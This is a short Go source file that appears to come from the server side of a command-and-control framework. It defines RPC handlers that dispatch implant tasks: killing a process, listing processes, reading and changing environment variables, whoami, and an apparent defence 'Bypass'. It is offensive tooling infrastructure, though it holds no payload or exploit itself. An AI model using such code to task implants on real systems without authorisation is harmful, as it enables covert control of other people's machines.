package rpc

import (
	"context"
	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/chainreactors/IoM-go/types"
)

func (rpc *Server) Kill(ctx context.Context, req *implantpb.Request) (*clientpb.Task, error) {
	return rpc.AssertAndHandle(ctx, req, consts.ModuleKill, types.MsgEmpty)
}

func (rpc *Server) Ps(ctx context.Context, req *implantpb.Request) (*clientpb.Task, error) {
	return rpc.AssertAndHandle(ctx, req, consts.ModulePs, types.MsgPs)
}

func (rpc *Server) Env(ctx context.Context, req *implantpb.Request) (*clientpb.Task, error) {
	return rpc.AssertAndHandle(ctx, req, consts.ModuleEnv, types.MsgResponse)
}

func (rpc *Server) SetEnv(ctx context.Context, req *implantpb.Request) (*clientpb.Task, error) {
	return rpc.AssertAndHandle(ctx, req, consts.ModuleSetEnv, types.MsgEmpty)
}

func (rpc *Server) UnsetEnv(ctx context.Context, req *implantpb.Request) (*clientpb.Task, error) {
	return rpc.AssertAndHandle(ctx, req, consts.ModuleUnsetEnv, types.MsgEmpty)
}

func (rpc *Server) Whoami(ctx context.Context, req *implantpb.Request) (*clientpb.Task, error) {
	return rpc.AssertAndHandle(ctx, req, consts.ModuleWhoami, types.MsgResponse)
}

func (rpc *Server) Bypass(ctx context.Context, req *implantpb.BypassRequest) (*clientpb.Task, error) {
	return rpc.GenericInternal(ctx, req, types.MsgEmpty)
}
